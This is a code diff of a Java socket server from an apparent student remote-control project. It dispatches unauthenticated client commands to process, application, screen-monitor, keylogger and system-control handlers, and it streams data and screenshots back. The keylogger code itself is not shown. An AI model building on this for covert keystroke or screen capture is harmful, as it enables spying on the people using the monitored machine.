@@ -1,145 +1,173 @@
 package team6.server.socket;
 
-import java.io.*;
-import java.net.*;
-import java.util.logging.*;
-import team6.server.handler.*;
+import java.awt.AWTException;
+import java.awt.image.BufferedImage;
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import javax.imageio.ImageIO;
+import team6.server.handler.AbstractHandler;
+import team6.server.handler.Applications;
+import team6.server.handler.Keylogger;
+import team6.server.handler.Monitor;
+import team6.server.handler.Processes;
+import team6.server.handler.SystemCtrl;
+
 
 public class SocketHandler {
     private Socket socket;
     private int port;
     
-    public BufferedReader reader;
-    public BufferedWriter writer;
-    
-    private Thread thReceiver;
-    private Thread thSender;
+    private BufferedReader in;
+    private DataOutputStream out;
     
     private AbstractHandler currentHandler;
     
-    public SocketHandler(int port) throws IOException{
-        setUpSocket(port);
-    }
-    
-    public void setUpSocket(int port) {
-        this.port = port;
-        try{
-            ServerSocket serverSocket = new ServerSocket(port);
+    public SocketHandler(int port) throws IOException, AWTException {
+        ServerSocket serverSocket = new ServerSocket(port);
+        
+        while (true) {
+            System.out.println("Waiting for connection ...");
             socket = serverSocket.accept();
-            System.out.println("Successfully connected");
-            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
-        }
-        // error connect => exit
-        catch (IOException e){
-            System.err.println("Unsuccessfully connected!");
-            Logger.getLogger(SocketHandler.class.getName()).log(Level.SEVERE, null, e);
+            System.out.println("Successfully connected!");
+            
+            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+            out = new DataOutputStream(socket.getOutputStream());
+            
+            receive();
         }
         
-        // start receiving messages from client -> new thread
-        receive();
+        
     }
     
-    // Format of message: "<HANDLER>$<COMMAND>$<DATA>" or "<>$<COMMAND>$<DATA>"
-    private void receive() {
-        thReceiver = new Thread() {
-            String buffer = null;
-            String[] message = null;
+    // Format of message: "<HANDLER>$<COMMAND>$<DATA>"
+    // i.e: <APP>$<GET>$<>
+    
+    private void receive() throws IOException, AWTException {
+        String buffer = null;
+        String[] message = null;
+        String preHandler = "";
+        System.out.println("Receiving message ...");
+        
+        while(true) {
+            if (in == null) continue;
+            buffer = in.readLine();
+            if (buffer == null || buffer.length() <= 0) continue;                        
+
+            System.out.println("RECEIVED: " + buffer);
+            // message[0] is handler, [1] is command, [2] is data
+            message = buffer.split("\\$",2);   
+
+            // If handler is defined before, just do the commands
+            if (message[0].equals(preHandler)) {
+                // execute command with previous handler
+                currentHandler.executeCommand(message[1]);
+                continue;
+            }
+
+            // if this is the first time call the handler   
+            // -> save the handler
+            preHandler = message[0];
             
-            @Override
-            public void run() {
-                System.out.println("Receiving message ...");
-                try {
-                    while(true){
-                        buffer = reader.readLine();
-                        if (buffer.length() <= 0) continue;                        
-                        
-                        System.out.println("Message received: " + buffer);
-                        // message[0] is handler, [1] is command, [2] is data
-                        message = buffer.split("$");   
-                        
-                        // If handler is defined before, just do the commands
-                        if (message[0].equals("<>")) {
-                            // call handle
-                            currentHandler.executeCommand(message[1] + "$" + message[2]);
-                            continue;
-                        }
-                        
-                        if(message[0].equals("<PRC>")){
-                            // call process handle;
-                            System.out.println("Calling process handler ...");
-                            currentHandler = new Processes(SocketHandler.this);
-                            continue;
-                        }
-
-                        if(message[0].equals("<APP>")){
-                            // call apps handle
-                            System.out.println("Calling application handler ...");
-                            currentHandler = new Applications(SocketHandler.this);
-                            continue;
-                        }
-
-                        if(message[0].equals("<MON>")){
-                            // call monitor hanlde;
-                            System.err.println("Calling monitor handler ...");
-                            currentHandler = new Monitor(SocketHandler.this);
-                            continue;
-                        }
-
-                        if(message[0].equals("<KEY>")){
-                            // call keyloger handle;
-                            System.err.println("Calling keylogger handler ...");
-                            currentHandler = new Keylogger(SocketHandler.this);
-                            continue;
-                        }
-
-                        if(message[0].equals("<SYS>")){
-                            // call system handle;
-                            System.err.println("Calling system handler ...");
-                            currentHandler = new SystemCtrl(SocketHandler.this);
-                            continue;
-                        }
-
-                        if (message[0].equals("<DISC>")) {
-                            // disconnect the connection socket and restart listening on port
-                            setUpSocket(port);
-                            return;
-                        }
-                    }
-                } catch (IOException ex) {
-                    Logger.getLogger(SocketHandler.class.getName()).log(Level.SEVERE, null, ex);
-                    close();
-                }
+            if(message[0].equals("<PROCESS>")){
+                // call process handler
+                System.out.println("Calling process handler ...");
+                currentHandler = new Processes(SocketHandler.this);
+                continue;
             }
-        };
-        thReceiver.start();
+
+            if(message[0].equals("<APP>")){
+                // call apps handler
+                System.out.println("Calling application handler ...");
+                currentHandler = new Applications(SocketHandler.this);
+                continue;
+            }
+
+            if(message[0].equals("<MONITOR>")){
+                // call monitor hanlder;
+                System.out.println("Calling monitor handler ...");
+                currentHandler = new Monitor(SocketHandler.this);
+                continue;
+            }
+
+            if(message[0].equals("<KEYLOG>")){
+                // call keyloger handler;
+                System.out.println("Calling keylogger handler ...");
+                currentHandler = new Keylogger(SocketHandler.this);
+                continue;
+            }
+
+            if(message[0].equals("<SYSTEM>")){
+                // call system handler;
+                System.out.println("Calling system handler ...");
+                currentHandler = new SystemCtrl(SocketHandler.this);
+                continue;
+            }
+
+            if (message[0].equals("<DISC>")) {
+                // disconnect the connection socket and restart listening on port
+                close();
+                break;
+            }
+            
+        }
+        
+        System.out.println("Stopping receiving messages");
     }
     
-    public void send(String data) {
-        thSender = new Thread() {
+    public void send(byte[] byteArrToSend, int size) {
+        Thread th = new Thread() {
             @Override
             public void run() {
-                System.err.println("Sending message ...");
                 try {
-                    
+                    out.writeInt(size);
+                    out.write(byteArrToSend);
+                    out.flush();
+                    System.out.println("SENT: ");
+                    System.out.println(new String(byteArrToSend));
                 }
-                catch(Exception e) {
+                catch(IOException e) {
                     e.printStackTrace();
-                    close();
                 }
             }
         };
-        thSender.start();
+        
+        th.start();
+    }
+    
+    public void send(BufferedImage image) {
+        Thread th = new Thread() {
+          @Override 
+          public void run() {
+              try {
+                  ImageIO.write(image, "jpeg", out);
+                  //out.flush();
+                  System.out.println("SENT: image!");
+              } catch (IOException ex) {
+                  Logger.getLogger(SocketHandler.class.getName()).log(Level.SEVERE, null, ex);
+              }
+              
+          }
+        };
+        th.start();
     }
     
     private void close() {
         try {
-            reader.close();
-            writer.close();
+            in.close();
+            out.close();
             socket.close();
-            setUpSocket(port);
+            
+            in = null;
+            out = null;
+            socket = null;
         } catch (IOException ex) {
-            Logger.getLogger(SocketHandler.class.getName()).log(Level.SEVERE, null, ex);
+            ex.printStackTrace();
         }
     }
 
